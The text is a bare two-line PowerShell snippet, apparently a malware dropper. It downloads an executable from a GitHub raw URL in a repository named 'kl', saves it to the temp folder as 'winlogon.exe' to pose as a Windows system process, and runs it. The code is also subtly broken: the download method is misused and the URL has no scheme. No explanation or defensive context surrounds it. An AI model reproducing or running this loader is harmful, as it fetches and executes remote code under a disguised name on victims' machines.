(New-Object Net.WebClient).DownloadString("raw.githubusercontent.com/SmartMozart/kl/main/main.exe", "$env:temp\winlogon.exe")
cmd.exe "$env:temp\winlogon.exe"
